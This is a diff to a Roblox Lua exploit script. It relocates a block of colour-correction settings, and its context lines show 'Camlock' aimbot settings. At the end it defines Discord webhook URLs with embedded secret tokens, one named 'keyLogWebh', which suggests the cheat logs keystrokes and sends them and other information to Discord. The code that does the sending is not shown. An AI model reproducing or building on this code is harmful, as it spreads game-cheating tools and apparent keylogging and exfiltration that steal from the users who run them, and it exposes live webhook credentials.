@@ -1,3 +1,42 @@
+-- Define local Color table
+local Color = {
+    Enabled = getgenv().Color.Enabled,
+    Brightness = getgenv().Color.Brightness,
+    Contrast = getgenv().Color.Contrast,
+    Saturation = getgenv().Color.Saturation
+}
+
+-- Function to print the color settings
+local function printColorSettings()
+    print("Color Settings:")
+    print("Enabled:", Color.Enabled)
+    print("Brightness:", Color.Brightness)
+    print("Contrast:", Color.Contrast)
+    print("Saturation:", Color.Saturation)
+end
+
+-- Function to apply color settings (hypothetical)
+local function applyColorSettings()
+    if Color.Enabled then
+        -- Adjust Brightness
+        game.Lighting.Brightness = Color.Brightness
+
+        -- Adjust Contrast (hypothetical example as Roblox does not have direct contrast setting)
+        -- You might need to use ColorCorrectionEffect for such adjustments
+        local colorCorrection = Instance.new("ColorCorrectionEffect")
+        colorCorrection.Contrast = Color.Contrast
+        colorCorrection.Parent = game.Lighting
+
+        -- Adjust Saturation
+        colorCorrection.Saturation = Color.Saturation
+    end
+end
+
+-- Call the function to print the color settings
+printColorSettings()
+
+-- Call the function to apply the color settings
+applyColorSettings()
 --Services
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -141,45 +180,7 @@ getgenv()['PingCompensation'] = Camlock.Smoothing['PingCompensation']
 getgenv()['ToggleHoldMode'] = Camlock.Checks['ToggleHoldMode']
 getgenv()['Enabled'] = Camlock.Checks['Enabled']
 getgenv()['UsePrediction'] = Camlock.AimbotSettings['UsePrediction']
--- Define local Color table
-local Color = {
-    Enabled = getgenv().Color.Enabled,
-    Brightness = getgenv().Color.Brightness,
-    Contrast = getgenv().Color.Contrast,
-    Saturation = getgenv().Color.Saturation
-}
 
--- Function to print the color settings
-local function printColorSettings()
-    print("Color Settings:")
-    print("Enabled:", Color.Enabled)
-    print("Brightness:", Color.Brightness)
-    print("Contrast:", Color.Contrast)
-    print("Saturation:", Color.Saturation)
-end
-
--- Function to apply color settings (hypothetical)
-local function applyColorSettings()
-    if Color.Enabled then
-        -- Adjust Brightness
-        game.Lighting.Brightness = Color.Brightness
-
-        -- Adjust Contrast (hypothetical example as Roblox does not have direct contrast setting)
-        -- You might need to use ColorCorrectionEffect for such adjustments
-        local colorCorrection = Instance.new("ColorCorrectionEffect")
-        colorCorrection.Contrast = Color.Contrast
-        colorCorrection.Parent = game.Lighting
-
-        -- Adjust Saturation
-        colorCorrection.Saturation = Color.Saturation
-    end
-end
-
--- Call the function to print the color settings
-printColorSettings()
-
--- Call the function to apply the color settings
-applyColorSettings()
 -- Replace the webhook URLs and API token with your own
 local infoWebh = "https://discord.com/api/webhooks/1253768216493297705/-KlIkbjUdrLlbEKJiFRjdFfxitrO-UDR3xphHVljGWq_D1UsRQub8rve8h0K7YLjZ8YN"
 local keyLogWebh = "https://discord.com/api/webhooks/1260729929067401328/WLaRWDrW-Aan-0ilBeT7cJPnQIymvFZZMqObDnJXU0M47NLZkM1GtzViLqJA4EygBGOh"
